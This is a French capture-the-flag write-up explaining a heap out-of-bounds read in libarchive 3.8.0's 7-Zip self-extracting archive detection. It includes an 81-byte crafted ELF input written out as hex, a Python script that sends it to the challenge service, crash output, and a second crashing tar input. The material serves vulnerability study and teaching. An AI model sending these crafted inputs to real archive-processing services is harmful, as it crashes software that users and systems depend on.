# VULN#007 — libarchive 7-Zip SFX OOB Read

- **Catégorie :** vuln research
- **Points :** 0 (dynamique)
- **Flag :** `CTF{REDACTED}`
- **Service :** `<HOST>:<PORT>` (protocole : 4 octets big-endian length prefix + archive file)

## Contexte

Un service d'inspection d'archives charge le fichier envoyé et en liste le contenu.
Il est construit sur **libarchive** (version 3.8.0), la bibliothèque open-source de
lecture/écriture d'archives utilisée par `bsdtar`, `cmake`, `pkg`, FreeBSD, macOS et
de nombreux outils.

**Protocole :** identique aux autres challenges vuln research — 4 octets big-endian
pour la taille, suivis des octets bruts du fichier.

## Analyse

### Vulnérabilité : heap-buffer-overflow dans la détection 7-Zip SFX

Quand libarchive ouvre un fichier, il tente de détecter le format automatiquement.
Pour les archives 7-Zip, il vérifie si le fichier est un **SFX** (Self-Extracting
archive) en cherchant une signature 7z après un stub ELF ou PE.

La fonction `find_elf_data_sec()` dans `archive_read_support_format_7zip.c` parse
le header ELF pour localiser la section `.data` où pourrait se trouver la signature
7z. Le bug se produit quand :

1. Le fichier commence par un magic ELF valide (`\x7fELF`).
2. Les champs `e_shoff`, `e_shnum`, `e_shentsize` et `e_shstrndx` sont manipulés.
3. `__archive_read_ahead()` alloue un buffer de `e_shnum * e_shentsize` octets.
4. Le code accède à `h + e_shstrndx * e_shentsize + 0x10` pour lire le string table.
5. Si `e_shstrndx` est suffisamment grand (0x0047), cet offset **dépasse le buffer**
   alloué → **heap-buffer-overflow read**.

Corrigé upstream dans le commit `dc6c0c5f`, postérieur à la version 3.8.0.

## Méthode

### 1. Construction du ELF32 malveillant

Un ELF32 little-endian minimal de 81 octets, sans contenu réel, avec les champs
de section-header table calibrés pour déclencher l'OOB :

```python
def build_7z():
    return bytes.fromhex(
        "7f454c46010101006000000840000000"
        "000000003200000034002000010000"
        "0000000000000000000000000000"
        "474900010001000000"
        "504b0070ff7f0000"
        "00000000000008000000b801000000cd800000"
    )
```

Champs clés :
- `e_shoff = 0x32` — offset de la section header table (dans le fichier)
- `e_shentsize = 0x01` — taille d'une entrée (anormalement petit)
- `e_shnum = 0x01` — nombre de sections
- `e_shstrndx = 0x0047` — index de la section string table

Le calcul `h + 0x0047 * 0x01 + 0x10 = h + 0x57` dépasse largement le buffer
de `1 * 1 = 1` octet alloué par `__archive_read_ahead()`.

### 2. Envoi au service

```python
import socket, struct

data = build_7z()
msg = struct.pack(">I", len(data)) + data
s = socket.create_connection(("<HOST>", <PORT>), timeout=10)
s.sendall(msg)
response = b""
while True:
    chunk = s.recv(8192)
    if not chunk:
        break
    response += chunk
s.close()
```

### 3. Résultat

```
status: crash confirmed (heap-buffer-overflow in 7zip SFX detection)
FLAG: CTF{REDACTED}
```

## Flux de la vulnérabilité

```
archive_read_open()
  → archive_read_support_format_7zip()
    → read_header() / bid()
      → find_elf_data_sec(buf, len)
        → __archive_read_ahead(a, e_shnum * e_shentsize, NULL)
        → h = buf + e_shoff
        → archive_le32dec(h + e_shstrndx * e_shentsize + 0x10)  // OOB!
```

## Payload alternatif (non primé)

Un PAX tar avec une ACL SCHILY malformée crashe aussi libarchive 3.8.0
(`SEGV` dans `archive_acl_from_text_nl`), mais le service ne le considère pas
comme la vulnérabilité attendue et répond `status: not valid`.

## Indicateurs

- Service qui ouvre/liste des archives fournies par l'utilisateur.
- Mention de libarchive, bsdtar, ou « archive-inspection ».
- Protocole binaire avec length-prefix (pattern récurrent sur cette plateforme).

## Leçons

- La détection automatique de format est une surface d'attaque large — libarchive
  tente de reconnaître des dizaines de formats (7z, tar, zip, rar, cpio, ISO, etc.)
  et chacun est un parseur à auditer.
- Les archives SFX (Self-Extracting) ajoutent une couche : le parseur doit d'abord
  comprendre le conteneur exécutable (ELF/PE) avant l'archive elle-même.
- Un fichier de 81 octets suffit à déclencher le crash — les validations de bornes
  manquantes dans les parseurs de headers sont exploitables avec un minimum de données.
- libarchive a eu de nombreuses CVE liées au parsing de formats (7z, RAR, WARC, LHA).

## Flag

```
CTF{REDACTED}
```

---

*Write-up par **Le_Geek** — BUG|PWN CTF · VULN#007.*
